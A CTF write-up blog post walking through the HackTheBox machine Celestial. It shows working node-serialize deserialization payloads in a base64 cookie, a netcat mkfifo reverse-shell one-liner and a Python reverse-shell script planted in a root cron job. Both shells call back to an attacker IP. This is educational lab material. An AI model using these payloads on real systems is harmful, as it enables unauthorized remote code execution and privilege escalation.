---
layout: post
title: "HackTheBox - Celestial writeup"
subtitle: "~ Walkthrough of Celestial machine from HackTheBox ~"
date: 2018-09-02
author: V3ded
category: CTF
tags: blog ctf pentesting hackthebox
finished: true
excerpt_separator: <!--more-->
---

<img src="/img/blog/htb-celestial/htb-celestial-00.png" width="417" height="136">
# Introduction
New week means new writeup from [HackTheBox](https://www.hackthebox.eu/){:target="_blank"}! This week's retired box is *Celestial*. *Celestial* machine improperly handles input which is fed to a *Node.js* `unserialize()` function. This allows the attacker to achieve command execution by passing a Javascript object to the previously mentioned function. Let's get into it! <!--more-->

***

# Scanning & Enumeration

Initial *nmap* scan:
```console
root@EdgeOfNight:~# nmap -sS -T4 -sV -sC 10.10.10.85

Starting Nmap 7.60 ( https://nmap.org ) at 2018-09-02 12:33 BST
Warning: 10.10.10.85 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.85
Host is up (0.11s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=utf-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.85 seconds
```
Nmap detects only 1 *HTTP* port open. Upon viewing the webpage we get a following view:

<a href="/img/blog/htb-celestial/htb-celestial-01.png" target="_blank"><img class="centerImgTiny" src="/img/blog/htb-celestial/htb-celestial-01.png"></a>

A plain webpage which shows a weird message. Normally I'd continue with directory bruteforce, but for the sake of keeping this blog short I won't because directory bruteforce is not the correct solution and won't yield any results.

Well, there isn't much to follow. Due to lack of leads, I decided to view each HTTP request I make to the server with an intercepting *Burpsuite* proxy.

<a href="/img/blog/htb-celestial/htb-celestial-02.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-celestial/htb-celestial-02.png"></a>

There seems to be a base64 encoded cookie (*profile=xxxx...*) which decodes to:
```console
root@EdgeOfNight:~# echo "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==" | base64 -d
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
```
> Note: "%3D%3D" is URL encoded equivalent of "==" 

Right, so we have some sort of *JSON* object parsing where 2+2 gets concatenated into 22. From security standpoint it's **ALWAYS** a bad practice to parse user input (in this case "num":"2") as it can be often missused and chained into a serious vulnerability such as an RCE. So, instinctively our best bet is to look for a Node.js parsing / serialization vulnerability. First few google queries return interesting results such as [this](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/){:target="_blank"} or [this](https://blog.websecurify.com/2017/02/hacking-node-serialize.html){:target="_blank"} and confirm our initial fear (or joy, depends if you are the attacker >:) ). An RCE is possible through passing of a serialized JavaScript Object.  Let's make our payload and get a shell!

***

# Exploitation 

### - Local Testing
First, install Node.js and Node.js serialize library with the command below (DEBIAN ONLY!). 
{% highlight bash %}
curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo apt-get install npm
sudo npm install node-serialize
{% endhighlight %}

This allows us to locally debug and test our exploit. 

In order to serialize() a Javascript object I use a script (script.js) that views kernel information with `uname -a`: 
{% highlight javascript %}
var y = {
rce : function(){
require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });
}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
{% endhighlight %}

<a href="/img/blog/htb-celestial/htb-celestial-03.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-celestial/htb-celestial-03.png"></a>

By using IIFE ([Javascript's immediately invoked function expression](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression){:target="_blank"}) we can execute this code. IIFE is something like a constructor. By appending `()` after the function's body we can immediately run the function and therefore run the malicious code. With IIFE the previously made *JSON* object would look like this: 

```console
{"rce":"_$$ND_FUNC$$_function(){\n require('child_process').exec('uname -a', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```

By unserializing this serialized object we get command execution.
{% highlight javascript %}
var serialize = require('node-serialize');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'uname -a\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.unserialize(payload);
{% endhighlight %}

<a href="/img/blog/htb-celestial/htb-celestial-04.png" target="_blank"><img class="centerImgLarge" src="/img/blog/htb-celestial/htb-celestial-04.png"></a>

Awesome! All we need to do now is to find a way to get a reverse shell. Simply replace `uname -a` with a [reverse shell one liner](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"}. I will be using netcat one - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f`. The final payload will look something like this:
{% highlight javascript %}
{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.112 1234 >/tmp/f\', function(error, stdout, stderr) { console.log(stdout) });}()"}
{% endhighlight %}

> Note: Replace 10.10.15.112 with your "connect-back" IP

### - Summing it all up 
So far we have 2 *JSON* objects. The original one: 
{% highlight json %}
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
{% endhighlight %}
and the weaponized one:
{% highlight json %}
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.112 1234 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) });}()"}
{% endhighlight %}

Combine them into one single object, base64 & url encode (change "==" into "%3D%3D") the result and replace the original encoded cookie with our new weaponized one. 

Merged *JSON* object:
{% highlight json %}
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2","rce":"_$$ND_FUNC$$_function (){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.112 1234 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) });}()"}
{% endhighlight %}

Encoded *JSON* object:<br>
<a href="/img/blog/htb-celestial/htb-celestial-05.png" target="_blank"><img src="/img/blog/htb-celestial/htb-celestial-05.png"></a>

Replacing of the cookie:<br>
<a href="/img/blog/htb-celestial/htb-celestial-06.png" target="_blank"><img src="/img/blog/htb-celestial/htb-celestial-06.png"></a>

Shell:<br>
<a href="/img/blog/htb-celestial/htb-celestial-07.png" target="_blank"><img src="/img/blog/htb-celestial/htb-celestial-07.png"></a>

Result is a nice shell! Go and get your deserved user flag!

***

# Privilege escalation
Navigating to `/home/sun/Documents` you can find a writable *script.py* file. 

<a href="/img/blog/htb-celestial/htb-celestial-08.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-celestial/htb-celestial-08.png"></a>

Doing some recon I find out that there's a cron job running this script as root every 5 minutes. We can escalate our privileges by placing a reverse shell into the script (because it's writable) or any other python code. It will be executed with root permissions. 

My reverse shell looks as follows:
{% highlight python %}
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.112",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
{% endhighlight %}
> Note: Don't forget to replace your IP again! 

<a href="/img/blog/htb-celestial/htb-celestial-09.png" target="_blank"><img class="centerImgMedium" src="/img/blog/htb-celestial/htb-celestial-09.png"></a>

### Rooted! Congratulations! 

***

# Conclusion
Thanks for reading guys! I enjoyed this box mainly because it contained a serialization vulnerability. There are other similar ones to explore - python pickles or php object injections and so on. Beauty is, that these types of exploits require a lot of manual work and can't be downloaded somewhere on the internet. I feel like one learns a lot from such vulnerabilities. Thank you for the box [3ndG4me](https://github.com/3ndG4me){:target="_blank"}!

~V3
